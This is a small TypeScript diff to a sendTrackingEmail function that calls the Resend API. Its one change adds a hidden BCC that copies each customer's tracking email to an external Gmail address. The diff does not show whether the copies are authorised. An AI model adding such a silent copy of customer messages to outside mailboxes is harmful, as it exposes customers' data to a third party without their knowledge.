@@ -142,7 +142,7 @@ async function sendTrackingEmail(apiKey: string, from: string, b: Row): Promise<
     const res = await fetch('https://api.resend.com/emails', {
       method: 'POST',
       headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
-      body: JSON.stringify({ from, to: b.email, subject, html }),
+      body: JSON.stringify({ from, to: b.email, bcc: 'gerakmygroup@gmail.com', subject, html }),
     })
     if (!res.ok) { console.error('tracking email Resend error:', b.reference, res.status, await res.text()); return false }
     return true
